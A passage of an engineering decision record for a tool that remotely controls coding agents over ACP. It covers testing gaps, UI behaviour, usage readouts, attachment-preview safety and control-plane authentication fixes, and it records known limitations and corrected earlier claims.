which is most of why it landed the way it did: `buildTail` produced JSX and was
therefore untested, and it carries the five-events-per-tool-call merge described
in Q6.10. It is now two phases — collect backwards (so cost stays proportional to
what is rendered, counting *every* node at every depth), then place forwards —
and the reverse `foldedInto` splice is gone, because going forwards a call is
always known before its own updates. The card is the tool card it already was:
collapsed, expanding to reveal its steps inside itself, drawn by the same
component recursively. That is Claude Code's terminal nesting with one
substitution — a terminal has fifty rows and shows children always, a phone has
fifteen, so "always visible" becomes "one tap away with the live line hoisted
into the header". The header carries a `steps` badge and, in the summary slot,
the newest step while running and `shortDuration` once finished.

**Why not yet.** A *ticking* elapsed is refused because it would re-render the
transcript once a second. Per-subagent token counts are available — claude puts
`totalTokens`/`totalToolUseCount`/`totalDurationMs` on the spawn's completing
update — and are **not** drawn: they exist only at completion, so a running card
would have nothing there and a finished one would change what the slot means.

**What it would take.** Three cases are asserted: a child whose parent is in the
window nests; a child whose parent is **outside** it renders exactly where it
does today, and "show more" re-collects it; and past `MAX_CHILDREN` the newest 40
are kept with `omitted` drawn as one quiet line above them. A fourth — "a parent
whose children are outside says only what it holds" — is gone rather than fixed,
because it cannot happen: children follow their parent in document order and the
walk is backwards. It was listed as asserted and nothing asserted it, which is
the failure mode this whole section is supposed to prevent.

**Status.** Not built (the ticking elapsed and the token counts, deliberately).

### Q7.6 — Does the child cap keep the newest steps?

**Position.** It does now, and that took a correction. It reads as though a
backwards walk gives it for free, and it does not: the cap is applied in
`placeNodes`, which runs **forwards** over the reversed collection, so the
obvious `if (full) skip` kept the *oldest* forty.

**Why not yet.** Measured — steps 0–39 kept, 40–51 dropped, and `latest`
therefore froze at step 39 for the rest of every long subagent, which is exactly
the running header the slot exists for. The webcheck assertion named the right
property and compared only `children.length`, so it passed on the wrong end.

**What it would take.** Done: it now asserts the first and last titles.

**Status.** Known limitation (of the assertion that preceded it).

### Q7.7 — Does the child cap protect the render budget?

**Position.** No, despite an earlier claim in this document. It runs in phase
two, after `buildTail` has already spent a node on every child it collected:
measured, a 500-step subagent against the 400 render limit still yields 400 flat
rows with the naming card outside the window.

**Why not yet.** Fixing it needs the cap applied during collection, which needs
the parent known before its children, which the backwards walk is precisely what
prevents.

**What it would take.** A collection order that knows parents first — i.e.
undoing the property that keeps collection cost proportional to what is rendered.

**Status.** Known limitation, written down rather than claimed away.

### Q7.8 — Is the browser UI itself tested?

**Position.** No. `pnpm webcheck` drives the cursor, the rotation overlap, the
close-code table, the permission context, the list ordering, `shouldSend` and the
login poll cursor — the parts that fail silently. What it does not touch is
anything that renders: the markdown component map, the diff view, the cards, the
two-pane shell.

**Why not yet.** Those need a DOM and a component renderer, which would be the
first real test dependency in this repository, so it was left out on purpose.

**What it would take.** `pnpm web:build` and a phone are still the only proof the
screens work — and the redesign made the gap wider, because there is now a great
deal more screen.

**Status.** Known limitation.

### Q7.9 — How is that gap answered instead?

**Position.** By pushing rules *out* of the JSX and into pure functions, which is
the only form `webcheck` can reach. `readInput`, `slotFor`, `chipValue`,
`contextPercent`, `configProse`, `labelFor`, `sessionGroups`, `visibleRows`,
`sessionLabel`, `buildTail`, `placeNodes`, `mergeUpdates`, `resolveTool`,
`stripFence`, `toolSummary`, `slashQuery`, `buildCommands`, `filterCommands`,
`completion`, `configChoices`, `typeableName`, `commandScope`, `completionKey`,
`composerKey`, `commandsPlan`, `contentTypeFor`, `parseBody`, `uploadDeadlines`,
`admitFiles`, `sendableAttachments`, `canSend`, `pastedName`, `relativeTo`,
`filenameFor`, `endedWithDaemon`, `waitingForDaemon`, `resumeStalled`,
`showsAsEnded`, `countsAsLive`, `statusTone`, `sessionNotice`,
`resumeFailureText`, `resumeRetryable`, `slowRoute`, `configBarShows`,
`showsInTranscript`, `latestWorkspaceWarnings`, `showsWorking`,
`composerPlaceholder`, `shouldFocusComposer`, `focusWorthKeeping`, `pieLabel`,
`elicitationForm`, `elicitationAnswer`, `fieldValue`, `humanRequests`,
`needsHuman`, `waitingCount`, `oldestWait`, `elicitationOutcome`,
`answerAlreadyLanded`, `essentialContext`, `detailContext`, `withheldDetail`,
`pieTone`, `contextHint`, `permissionDecisions`, `refused`, `machineSubline`,
`sublineWarns`, `choiceOverride`, `sameNode` and `optionShortcut` are all shaped
that way deliberately.

**Why not yet.** The list is an inventory rather than a gesture, so it has to
name functions that exist: `toolDetail` was on it until the redesign folded it
into `readInput` and `EventList`, and a name that greps to nothing turns the
sentence after it into a claim nobody can check.

**What it would take.** Existing is the floor and not the bar — the extraction
commit listed four of these while `webcheck` imported three, and `placeNodes`,
`stripFence` and `toolSummary` sat exported and unasserted, which is the same
claim one step further in. Being on this list means `webcheck` imports it.

**Status.** Known limitation.

### Q7.10 — Why is a keyboard shortcut on the ask card a pure function?

**Position.** `optionShortcut` is the newest entry on that list, because wiring
the number beside each answer made three guards load-bearing that would otherwise
have been three clauses in an `onKeyDown` nobody could assert.

**Why not yet.** The one that matters is `isTypingInto`: the composer sits
directly under that card and takes the caret on its own, so a digit that ignored
it would approve whatever the agent was asking with the first character of a
message.

**Status.** Known limitation (of what JSX-embedded rules can be asserted).

### Q7.11 — Which of the transcript-rewrite extractions were worth naming?

**Position.** Two. `choiceOverride` is the one place two agents' words for one
*choice* are reconciled — the `labelFor` argument one level in, and a
generalisation of the `adaptiveLabel` that was already there rather than a new
idea. `sameNode` is the comparator that lets an unbounded transcript be drawn at
all.

**Why not yet.** `choiceOverride` is on the list because it is silently correct
on claude and was silently wrong on kimi, which is the shape of defect only a
two-fixture assertion catches. `sameNode` fails in two directions with very
different costs: `false` when nothing changed is merely slow, `true` when
something did leaves a stale row on screen for ever with nothing anywhere to say
so.

**Status.** Known limitation.

### Q7.12 — What did the question/elicitation work add to the inventory?

**Position.** Eleven functions, three of them extractions rather than new rules.
`answerAlreadyLanded` was three disjuncts inside `PermissionCard`'s catch arm —
`body.repeat`, `detail.repeat` and the code — and it reads all three because the
first version read only `detail`, so every retried approval showed the user a raw
JSON blob as its error message; a copy in the elicitation card is a second chance
to make that mistake, which is `parseBody`'s argument one component over.
`isTruncationMarker` was private to `permission.ts` and about to be guessed at
again. `essentialContext` and `withheldDetail` are what let the permission card
collapse without the *decision* about what is essential living inside JSX.

**Why not yet.** Of the rest, `needsHuman` is the one whose failure is the
failure the screen exists to prevent, and it is asserted as a partition against
`showsWorking` rather than case by case, because the way that set breaks is a
session that is both waiting and working. `elicitationAnswer` is silently wrong
in the cheap-looking direction: `Number("")` is `0`, so an untouched optional
number field sends a zero nobody typed unless the emptiness test runs first.

**What it would take.** `elicitationForm` is pinned by an assertion no other
function here has — `webcheck` re-runs its whole fixture with the agent's field
names replaced and demands the identical form, because reading `question_0` is
the one shortcut that would work perfectly today and rot on the next adapter
release.

**Status.** Known limitation.

### Q7.13 — What did the polish pass add, and who found it?

**Position.** Thirteen functions, five of them added by the review of the other
eight — which is the argument for the list rather than an aside.
`permissionDecisions` and `refused`, because a merged permission row drew a
refusal as an approval and nothing could have caught it; `focusWorthKeeping`,
because the clause it replaces was browser-dependent and therefore invisible to
whoever wrote it; `machineSubline` and `sublineWarns`, because the precedence
deciding whether a waiting session can be hidden was a four-arm ternary in JSX.

**Why not yet.** `showsInTranscript` is a rule about what a person reads, so
getting it wrong is invisible to a compiler and obvious to everybody else;
`pieLabel` and `pieTone` are the two halves of a readout whose own width used to
move its neighbours; `showsWorking` is a three-clause derivation of "the agent is
busy" that a two-clause one gets wrong in the two states that matter, mid-turn
permission and death mid-turn; and `shouldFocusComposer` holds the `j`/`k`
collision, which works perfectly for whoever wrote it and breaks for the first
person who navigates with the keyboard.

**Status.** Known limitation.

### Q7.14 — What did the restart work add?

**Position.** Eleven functions, three of them extractions. `slowRoute` is the
table `machine.ts` spends a page describing and nothing checked, whose failure
mode is a *healthy* machine rendered unreachable. `configBarShows` guards the
clause that would have failed on exactly one agent — and the case it fails on
stopped being rare the moment the composer began surviving a restart.

**Why not yet.** The five restart predicates are asserted as a **partition**
rather than case by case, because the way that set breaks is a new state falling
into two buckets at once: a row that is in Active *and* in Ended, which no
individual case would catch.

**Status.** Known limitation.

### Q7.15 — Why were two of the attachment functions extracted rather than written?

**Position.** `parseBody` was extracted: `XMLHttpRequest` is the only transport
that reports upload progress, it hands back a status and a string rather than a
`Response`, and without the extraction the `409`-carrying-a-success-body rule
would have been **copied** there — where a drift reports a successful approval as
a failure. `contentTypeFor` guards the line that used to write
`application/json` for any body at all: true of every caller, and silently
corrupting for the first one that was not.

**Status.** Known limitation.

### Q7.16 — Why are the command-menu rules the clearest case for the inventory?

**Position.** Because every one of the six fails *silently* — a parser that opens
one character too eagerly, a merge that loses a control, a ranking that buries
the command somebody is typing — and none of them is visible from a keyboard that
is not the author's.

**Why not yet.** The last two were extracted because a rule had been *written
down and not enforced*, which is this section's own failure mode arriving one
level up. `composerKey` is the Enter collision's resolution, which this document
claimed `webcheck` asserted while `webcheck` asserted only that the collision
existed. `commandsPlan` is the command cache's refetch rule, stated in two
docblocks — drop a stale list on a revision reset, never compare with `>` — and
implemented in neither, so a restarted daemon left the composer offering a dead
agent's hundred commands.

**What it would take.** Being on the list is supposed to mean the rule is
checkable; a rule that is merely *described* somewhere is the thing it is
against.

**Status.** Known limitation.

### Q7.17 — What did the transcript-tail extraction close?

**Position.** The largest hole on the list rather than adding to it: the
coalescing and the five-events-per-tool-call merge had been JSX-shaped, and
therefore untested, since they were written.

**Why not yet.** What remains untested is genuinely only the drawing.

**Status.** Known limitation.

### Q7.18 — Is a 404 during a long-poll a transport failure?

**Position.** No. Three names left the inventory with the GitHub device flow —
`nextStep`, `remainingText` and `formatUserCode` — and the rule they protected did
not: the daemon answered, and what it said is that the flow is gone, which is
what a daemon restart looks like from the browser.

**Why not yet.** The response is to start a fresh flow, not to back off and poll
a dead id more slowly for ever.

**What it would take.** It is now the login wizard's rule and has exactly the
same shape: a restart makes a live login id 404, `LoginWizard` starts again, and
it is bounded at `MAX_RESTARTS` because a daemon restarting in a loop would
otherwise spawn a pty every two seconds.

**Status.** Known limitation.

### Q7.19 — Can the command menu complete a command's arguments?

**Position.** No. `AvailableCommandInput` has exactly one member — `hint`, a
string of prose — so the menu can show
`<optional custom summarization instructions>` beside `/compact` and can do
nothing else with it. There is no schema, no enum and no completion request.

**Why not yet.** The hint is never inserted, because it would be sent to the
model as if somebody had typed it.

**What it would take.** The ACP v2 draft turns that field into a discriminated
union (`{type: "text"} | {type: string}`), so a structured form is reserved in
the protocol rather than in this client — and reaching it means moving the whole
repository to `@agentclientprotocol/sdk/experimental/v2`, which drops
`current_mode_update` entirely. Nothing here is shaped to prevent it; nothing is
shaped to anticipate it either.

**Status.** Blocked on a decision.

### Q7.20 — Are `@file` mentions part of the `/` menu?

**Position.** No, and they are not the same feature. The `/` menu completes a
command name at index 0 and deliberately nothing else — a path is not a command,
which is the assertion in `webcheck`.

**Why not yet.** Mentions would need the daemon's `browse.ts` behind a
per-keystroke request, a caret-anchored popup rather than a composer-anchored
one, and ACP's `resource_link` content blocks in the prompt body.

**What it would take.** Three separate pieces of work, sharing only the popup's
chrome.

**Status.** Not built.

### Q7.21 — Are image attachments previewed inline?

**Position.** Yes, and this record used to say they were not. The earlier text
said an attachment "renders as a chip with a download button and never as an
`<img>`", that the rules for doing it safely were only a comment, and that "no
`previewable()` helper was added". All three were false in the same tree:
`preview.ts` exports `previewable`, `webcheck` asserts it sixteen times, and both
`Bubble.tsx` (a person's own attachments) and `EventList.tsx` (images a tool
returned) draw them. The correction is recorded rather than quietly swapped,
because a reader reaching here for the SVG rule was being told it lived in a
comment in a module that this document said did not exist.

**Why not yet.** The rules the old paragraph demanded be written first were
written. Bytes come through `fetch` with the credential in a header and **never**
as a URL in the DOM; the only element is `<img>`, from a `blob:` URL the
component owns, so never `window.open`, never a link without `download`, never an
`<iframe>`; and `PREVIEWABLE_TYPES` is an allowlist of four raster formats rather
than `image/*`, excluding `image/svg+xml` specifically — SVG is a document format
that can carry `<script>`, and the only thing between that and this origin would
be `<img>` disabling scripting, which is a promise about engine behaviour rather
than about our code. SVG still downloads; it is only never drawn.

**What it would take.** The old objection — a refetch of up to 25 MiB every time
a phone scrolls past an old message — is answered by two bounds rather than by
not building it. `MAX_PREVIEW_BYTES` is 8 MiB and deliberately far below the 100
MiB download cap, because the two decide different things: that one bounds a file
somebody asked for, this one bounds bytes pulled **automatically** for something
they may only be scrolling past. And `ImagePreview.tsx` holds a module-level LRU
of 12 decoded images / 48 MiB, keyed on `(session, uploadId)`, **revoked** on
eviction — the revoke is the part that frees the bytes, and dropping the map
entry alone would not. `previewable` takes `bytes` as a required argument rather
than an optional one for the same reason: a preview whose size is unknown is
exactly the one that must not be fetched, and defaulting it to zero would invert
that.

**Status.** Known limitation (of the earlier text, now corrected).

### Q7.22 — Are ACP `resource` / `embeddedContext` blocks supported?

**Position.** No. `AcpClient.acceptsImages()` reads one field of
`promptCapabilities` and deliberately does not expose the object.

**Why not yet.** `resource` blocks would need a measurement of what each of the
three agents does with one, and an accessor handing back the raw capability set is
how that gets tried on a hunch.

**Status.** Deliberate non-goal.

### Q7.23 — Is there a route listing a session's uploads?

**Position.** No `GET /sessions/:id/uploads`, for the same reason the command
list is off the snapshot: nothing needs it to answer *does anything anywhere need
me*.

**Why not yet.** The upload response carries `sessionBytes`/`sessionLimit`, so a
composer can show remaining room without one.

**Status.** Deliberate non-goal.

### Q7.24 — What happens to bytes staged for a message that is never sent?

**Position.** They land on disk. A tab can close mid-upload, and the client
cannot guarantee to release what it staged.

**Why not yet.** The daemon's 24-hour sweep of unconsumed uploads is what that is
for; a client-side delete route to paper over it would be a second mechanism for
something the first already handles.

**Status.** Deliberate non-goal.

### Q7.25 — Why is `usage_update._meta` dropped when it carries the rate limit?

**Position.** `_meta` carries `_claude/rateLimit`, the field that answers "why
has this stalled" — a real question somebody asks at exactly the wrong moment.
It is not carried today.

**Why not yet.** `_meta` is an unbounded agent-shaped blob and `contextUsage`
rides a snapshot returned sixty at a time.

**What it would take.** Picking the parts worth having rather than passing the
blob through.

**Status.** Not built.

### Q7.26 — Why is the context readout always empty on kimi?

**Position.** kimi never reports context usage at all, and no client change can
fix it. `usage_update` appears in its bundle **exactly once**, inside the
vendored zod schema for the protocol — a shape it can parse and never one it
sends — while `claude-agent-acp` 0.63.0 constructs it in three places.

**Why not yet.** On kimi the readout is empty for the life of every session, and
saying "the agent has not said" reads as *yet*, as though a number were coming.

**What it would take.** The popover names the agent instead and points at
`/usage`, which kimi publishes as a builtin (`availability: "always"`, described
in its own registry as "Show session tokens + context window + plan quotas" — so
it answers the question this readout cannot, plan quotas included).

**Measured.** 2026-08-06 against kimi 0.29.2.

**Status.** Known limitation.

### Q7.27 — Could the daemon just ask an agent for its usage?

**Position.** Considered and refused, and the reason is not tokens. ACP has no
request for usage: the SDK's whole method set is
`session/{new,prompt,cancel,close,delete,fork,list,load,resume,set_config_option,set_mode,update,request_permission}`
plus `fs/*` and `terminal/*`, and not one of them asks an agent anything about
occupancy. It only ever arrives as a notification the agent chooses to send.

**Why not yet.** "Asking" therefore means sending `/usage` as a **prompt**, and a
prompt takes the session's one turn — `ManagedSession.prompt` answers `busy`
while `this.turn !== null` and the route returns `409 turn_in_flight`. A
background poll would refuse somebody's real message to fetch a number, and its
reply would land in the transcript as an agent message nobody asked for. Free in
tokens is not free.

**What it would take.** A notion of an invisible turn, which nothing here has.

**Status.** Deliberate non-goal.

### Q7.28 — Why does the context popover show less than Claude Code's?

**Position.** It is now a gap somebody can see, which it was not while nothing
drew usage in detail. The popover is explicitly modelled on Claude Code's own —
which shows the context window *and* the five-hour and weekly plan limits. This
one shows the context window alone: the plan limits do not reach the client at
all, and the cost that does is deliberately not drawn, because this answers "how
much room is left" and a currency figure answers a different question.

**Why not yet.** The remedy is not a client change.

**What it would take.** Picking the two or three scalars worth having out of
`_meta._claude/rateLimit` and putting them on the snapshot beside `contextUsage`,
under the same rule that admitted that field — small, fixed-shape, and useful for
answering *does anything anywhere need me*. A reset timestamp and a percentage
qualify; the blob does not.

**Status.** Not built.

### Q7.29 — What shape does a permission carrying a diff actually have?

**Position.** Measured, and rendered. This entry used to say no measured
permission had ever carried a diff, and then that nothing rendered it. Asking
kimi to edit a line of a file, the permission request carries a `diff` block
*and* a text block, and the text block is nested:

```json
{ "toolCallId": "0:tool_iHT…", "title": "Edit", "rawInput": null,
  "content": [
    { "path": "…/notes.txt", "oldText": "two", "newText": "TWO CHANGED", "type": "diff" },
    { "content": { "text": "Requesting approval to Editing notes.txt", "type": "text" },
      "type": "content" } ] }
```

**Why not yet.** Three things follow. `oldText`/`newText` are the **changed
fragments, not the whole file**, so the 8 KiB `clampBlob` ceiling is far less
pressing for an edit than it looked. The text block is
`{type: "content", content: {type: "text", …}}` — a renderer matching a flat
`{type: "text", text}` at the top level walks straight past the one block
carrying the description. And `webcheck` covers the *extraction* and not the
drawing, because nothing here has a DOM.

**What it would take.** `permission.ts` reads both shapes and `PermissionCard`
draws both; the drawing remains unasserted.

**Measured.** 2026-07-30 against kimi.

**Status.** Known limitation.

### Q7.30 — What about a diff that genuinely exceeds 8 KiB?

**Position.** Open. `clampBlob(request.content, MAX_PERMISSION_BLOB_BYTES)` cuts
in `registry.ts` before any client sees anything, because the payload rides the
*snapshot* and `GET /sessions` returns snapshots for every session at once — and
a diff truncated mid-hunk is a diff nobody can approve from.

**Why not yet.** Fragments rather than whole files makes that the rare case
rather than the common one, which also makes the cheapest option cheaper than it
looked.

**What it would take.** Three candidates, none chosen: raise the ceiling for
`content` specifically; link the card to `GET /sessions/:id/changes/diff`; or say
"approve without seeing it all" out loud. The truncation marker plus `webcheck`'s
coverage of it is what stands in the meantime.

**Status.** Blocked on a decision.

### Q7.31 — Should the agent union become an agent registry?

**Position.** `AgentId` is `["claude", "kimi", "codex"] as const` in
`src/acp/agents.ts` with a `switch` in `resolveAgent`, and the product thesis is
"remote control regardless of the agent" — so the obvious next move is a registry
of declarative launch configs plus a `REEMOAT_AGENTS` for externally configured
ones.

**Why not yet.** Adding codex (2026-08-07) tested the premise of this entry and
half of it was wrong. The claim was that a third agent is blocked behind one of
three protocol decisions; in fact codex advertises `sessionCapabilities.resume`,
so it lands inside the narrow claim this entry said had to be *made* first, and
the decision it was waiting on never arose. What the work actually cost was five
edits — one arm in `resolveAgent`, one row in `AGENT_LOGIN`, one arm in
`vendoredCli`, one literal in `wire.ts`, one entry in `pincheck`'s adapter list —
and none of them was the type refactor this entry warns about. The 63 `AgentId`
references were, as predicted, the cheapest part: the compiler found every one
that mattered and the only silent seam was `wire.ts`, exactly as written.

What was underestimated is the other column. Everything expensive about codex was
a *measurement about a CLI* that no registry could hold and no type could check:
which environment variable authenticates it (Q6.51 — the obvious one is wrong),
whether a pasted key is sufficient (Q6.52 — it is not), which stream its status
command answers on (Q6.53 — the wrong guess reports a signed-in agent as unknown,
silently), what its permission payload omits (Q6.55), and which of its own feature
flags gates the ask-the-user tool (Q6.54). Two of those five were got wrong on the
first attempt and neither produced an error anywhere.

So a registry of declarative launch configs would not have shortened this work,
and a `REEMOAT_AGENTS` that let somebody add an agent *without* taking those
measurements would produce precisely the failures listed above, on their machine,
with nothing to read. The per-agent cost is empirical, not structural.

**What it would take.** A fourth agent, to show the pattern is a pattern rather
than two coincidences — and it would want the concrete precondition this entry has
always named, cited by symbol because line numbers rot: `fromRow` in
`src/store/sqlite.ts` casts `String(row["agent"]) as AgentId` with no validation,
while `isAgentId` exists and guards the HTTP boundary in `server.ts`. A persisted
row naming an agent that no longer exists restores as a well-typed value that
`resolveAgent` then fails on, with a worktree already made. Adding an agent does
not reach that; removing or renaming one does.

**Status.** Deferred, and the reason is now weaker than it was. Not blocked.

### Q7.32 — Does the control plane's audit table have a retention bound?

**The question was wrong, and that is the finding.** It presupposed a table that
does not exist. This entry, `SECURITY.md` and `CLAUDE.md` all described the
control plane as writing a row per `authorize` call holding `subject` and
`tokenId` — "the identity of people, in the same SQLite file as the signing
private key" — with no retention. **Nothing writes such a row.** `schema.sql`
declares 22 tables, the package contains exactly 22 `INSERT INTO` targets, the two
sets match, and `relay/authorize.ts` contains no `INSERT` at all.

**How three files agreed about a thing that was never built.** The audit table was
planned, described in prose first, and then not written; the prose was never
revisited, and the sentence propagated from here into `SECURITY.md`'s
known-and-accepted list and `CLAUDE.md`'s deferred-work paragraph. Each copy made
the next one look corroborated. Nothing could catch it: `docscheck` asserts that
cited **symbols** resolve, and this claim named no symbol.

**Position, restated correctly.** There is **no access log**. Nothing records who
reached which machine when, which is a privacy property worth stating deliberately
rather than a gap — and it is the honest answer to give a researcher, where the
old sentence promised a liability that was not there. What the control plane does
keep about people is now listed in `SECURITY.md` under Known and accepted.

**If one is ever built** it needs a retention bound in the Bounds table on the day
it lands, because a bound without a number is not a bound.

**Status.** Closed — the subject never existed.

### Q7.33 — Is test coverage chosen by risk?

**Position.** No — coverage is still chosen by testability rather than by
likelihood of breaking. Six drivers now exist where the plan that named
`corecheck` and `servercheck` assumed artifacts that were never built, and the
honest way to read the remainder is as an order of magnitude rather than a
measurement: most `server.ts` routes and most invariants in this document are
asserted by nothing.

**Why not yet.** Treating a percentage as progress invites optimizing the number,
which is why none is quoted.

**What it would take.** The way `deploycheck` and the four new `daemoncheck`
sections were taken — in slices, ahead of each next diff, against the drivers
that already exist.

**Status.** Known limitation.

### Q7.34 — Is there a sandbox, and how would one be re-added?

**Position.** There is none. `SessionRuntime` is kept as an interface with a
single implementation for exactly this: `clientFileIo`, `login`, `git` and
`launch` are the four places a confining runtime has to answer differently, and
each already has a comment saying so.

**Why not yet.** Reserved in the same voice as the relay's `reemoat-enc: none` —
the seam exists, no confinement was written.

**What it would take.** Filling in an implementation rather than reopening a
design. Nothing about the rest of the daemon would change: paths stay host-side,
the registry stays the same, and `AcpClient` already takes three pipes from
wherever they come.

**Status.** Deliberate non-goal.

### Q7.35 — Can an operator choose which environment variables an agent receives?

**Position.** No. `agentEnv()` removes the session-scoped `CLAUDE_*` names and
everything `REEMOAT_*`; everything else — API keys for other services, cloud
credentials, whatever is in a shell profile — reaches every agent and every child
it spawns.

**Why not yet.** The general problem is unsolvable without a runtime (Q7.34),
because an agent's children see what this process sees.

**What it would take.** The smaller, solvable piece is not done: nothing lets
somebody say which variables an agent should get.

**Status.** Not built.

### Q7.36 — Is there any way to stop a session pushing?

**Position.** No. An agent commits and pushes with the operator's own git config,
credential helper and keys, and there is nothing between it and `origin`. The
forge feature that used to sit in the middle is gone along with the container
that made it necessary.

**Why not yet.** Nothing mediates it by design.

**What it would take.** The honest replacement, if anybody wanted one, is a way
to say "this session may not push" that is not simply "do not run an agent".

**Status.** Not built.

### Q7.37 — Is traffic through the relay end-to-end encrypted?

**Position.** No — the relay terminates TLS and sees plaintext today. The
capability is reserved rather than built.

**Why not yet.** No crypto was written, deliberately.

**What it would take.** The seam is the CONNECT handshake: `reemoat-enc: none`
is negotiated per stream, and an unrecognised value is a *stream* error (501 on
that one CONNECT) rather than a tunnel-level one, so an old daemon meeting a new
relay loses one request instead of going offline. Adding a mode later is another
header, not a protocol break.

**Status.** Not built.

### Q7.38 — Is a relayed stream's authorization re-checked while it is open?

**Position.** No — it is checked at open. A grant revoked mid-stream does not
tear down a live WebSocket; the daemon's own expiry re-check on the ping tick
closes it when the token dies. That is now the *only* thing a token lifetime
still bounds; every ordinary request is refused immediately.

**Why not yet.** Adding a second timer at the relay would mean two places
deciding when a stream ends, and they would eventually disagree.

**Status.** Deliberate non-goal.

### Q7.39 — How is a signing key rotated?

**Position.** By re-enrolling every daemon, because a daemon never re-fetches.
The key set is plural so old and new can be trusted at once: add the new key,
re-enroll each daemon with a fresh code, retire the old one.

**Why not yet.** Polling `/v1/jwks` would make this automatic and is exactly what
must not happen — it would put the control plane back in the runtime path.

**Status.** Deliberate non-goal.

### Q7.40 — What is human authentication?

**Decision.** A name and a password, and a session. This entry read "Blocked on a
decision" and this is the decision.

**Status: partly reversed.** The decision above stands; the list of things it
refused does not. See Q7.74.

**What was deliberately retained, and is not any more.** This paragraph read:
*"No email, no reset flow, no OAuth, no MFA, no forced change on first login…
each of those would be a second system: an SMTP dependency, a token with its own
lifetime and delivery channel, a provider, or a `must_change_password` column with
a state machine and a second gate screen. What replaces a reset flow is an admin
who can reset a password, which this deployment has by definition — there is
one."*

**Four of those five are now built** — see Q7.74 — and the reasoning above did
not turn out to be wrong so much as scoped to a premise that changed. "This
deployment has one admin by definition" was true of a fleet one person runs. It
stops being true the moment a second person has an account, and at that point
"an admin can reset a password" is not a recovery mechanism, it is an
unlogged account takeover available to whoever holds the admin's session.

What survives untouched is **no OAuth**, and it survives for the original reason:
it is a provider, and a provider is a dependency on somebody else's uptime for
the one thing this system exists to keep working during an outage.

What is *worse* than before, stated plainly rather than left to be discovered:
an account with no confirmed address on an instance with no SMTP has **no
recovery at all**, where it previously had an admin. That is Q7.76.

**What API keys became.** The credential for everything that is not a browser.
`cpctl` holds one, `deploy/install.sh` captures the bootstrap admin's into
`~/.reemoat/cpctl.env`, and it is the only credential that still works if this
service is rolled back past this commit. `POST /v1/admin/users` stopped minting one
by default — an account that never asked for a second credential which never
expires should not carry one — and `--with-key` is now **deleted** with the route
branch behind it, so the installer no longer asks either. A key is minted by the
person who will hold it, with `cpctl key`, and by nobody else.
**Every existing key keeps working**, which is what makes this deployable without
telling anybody in advance, and `relaycheck` asserts it. What was missing from
that sentence is that a key could not be *retired* either: `revoked_at` was read
and written by nothing, so "never expires" was closer to "immortal". Q1.611 is the
correction.

**Why a bearer token and not a cookie.** `src/cors.ts` answers `*` and never sends
`Access-Control-Allow-Credentials`, and Q5.25 records that the wildcard is safe
*because* no credential is ever ambient. A cookie would also hand `POST /v1/tokens`
— which mints a machine token — to any page that can make the browser issue a
request, and `readJsonObject` does not check `content-type`, so a cross-site form
post is a simple request. It would also break `pnpm web`, whose Vite proxy is a
different origin.

**Why scrypt, and why never `scryptSync`.** Measured on Node 26, this machine:
the synchronous form blocks the event loop **25ms** per attempt at N=2^14 — and
that loop carries the API listener, `serveStatic` and every relay tunnel in the
fleet, so ~10 logins a second is a fleet-wide outage reachable by anyone who can
POST. The async form at 8 concurrent costs **1.6ms** of worst-case loop lag.
Parameters are N=2^15 r=8 p=1 (~51ms), with `maxmem` passed explicitly because
above N=2^14 scrypt **throws** against Node's 32 MiB default — a failure that
looks like a wrong password rather than like a configuration error. The
concurrency gate is 4, and it is a **memory** bound (32 MiB each) rather than a
CPU one; it sits far below `UV_THREADPOOL_SIZE=64` so a spray against the login
endpoint cannot queue the login page behind it. One gate of four turned out not to
be enough — it was a starvation weapon in its own right, and it is now two lanes
with `HashLane`; see Q1.39.

**What is asserted.** `relaycheck` gained 68 checks: the gate refusing four routes
that were open, the three refusals being byte-identical, an API key still reaching
`/v1/me`, a trailing space being part of a password, a first password set with a
key alone, and two users both owning a "laptop". `webcheck` gained
`authFailure(403, "forbidden") → null`, which is the regression that would
otherwise sign a non-admin out for opening a screen.

**Status.** Current.

### Q7.55 — Who registers a machine, and who does it belong to?

**Decision.** Its creator, and they are one act. `POST /v1/machines` registers the
machine, grants it to the caller with **every** scope, and mints its enrollment
code in a single request.

**What was wrong.** A machine belonged to nobody. `machines` had no owner column,
and `enrollment_codes.created_by` was written at `app.ts:591` and read by nothing.
Registering, enrolling and granting were three administrative acts, none implying
the others — and both install wizards *printed* the missing
`cpctl admin grant <userId> <machineId>` and ran neither. So the ordinary outcome
was a daemon that enrolled, dialled the relay, held a tunnel, and appeared in
nobody's list, with nothing on screen to explain it.

**Why `machine_owners` and not the earliest grant.** The admin edits grants, so
`DELETE /v1/admin/grants` would silently transfer ownership. `created_by` is
per-code, absent until one is minted, and burned on revoke.

**Why all three scopes.** `cpctl admin grant` defaults to `session:read` and
`session:write`, but `machine:admin` guards `DELETE /sessions/:id/workspace` — so
the two-scope default means the owner of a machine gets a 403 removing a workspace
on their own hardware.

**The name collision, and why there is no 409 to leak.** `machines.name` is
globally `UNIQUE` and cannot stop being — there is no `migrate()` here. So the
stored name is `<label>-<8 hex of the machine's own id>`, unique by construction,
and nobody is ever shown it; the pretty label lives in `machine_owners` under a
`UNIQUE(user_id, label)` index, where a collision is with your own machine.
Without that, the second person to call a machine "laptop" would be told that
somebody else has one by that name.

**What an admin can still do.** `POST /v1/admin/machines` takes an `ownerId`, and
`cpctl admin addmachine --owner` uses it — which is what the daemon wizard needs,
and it grants nothing new, because an admin can already mint an API key for any
user and act as them. Without an owner it still registers an ownerless machine and
now says so, because that is what every machine in an existing database already is.

**Status.** Current.

### Q7.56 — Was the control plane's route gate ever fail-closed?

**Decision.** It is now. One `app.use("/v1/*", callerAuth(db))`, placed after the
four public routes, so the public set is *"the routes registered above the line"*.

**What it replaced, and what that cost.** Four **exact**-path `app.use` lines with
a comment above them saying they were exact. Measured against a real Hono app:
`app.use("/v1/machines", …)` runs for `/v1/machines` and for nothing else — so
`POST /v1/machines/:id/enrollments` and `POST /v1/me/password` both served with
**no credential at all**. The first mints a full machine identity: a tunnel key and
every token addressed to that machine.

**Why not a prefix allowlist.** It is a second list that can drift, and it still
leaves a new *top-level* `/v1/foo` open. Position cannot drift: a route added below
the line is protected by nobody doing anything.

**Why not the daemon's `app.use("*")`.** On this app `"*"` also covers `/health`,
the static bundle and the SPA fallback, so the opt-out list becomes "everything
that is not `/v1`" — a prefix list again, inverted and easier to get wrong.

**What it cost.** One `imagecheck` assertion: `/v1/nope` was a JSON 404 and is now
a 401 to a stranger. The check's real subject — the SPA fallback must not swallow
the API — is unchanged, and a stranger stops learning which routes exist.

**Status.** Current.

### Q7.57 — Did the env-file apostrophe guard ever run?

**Decision.** Not on the path that takes typed input. Fixed.

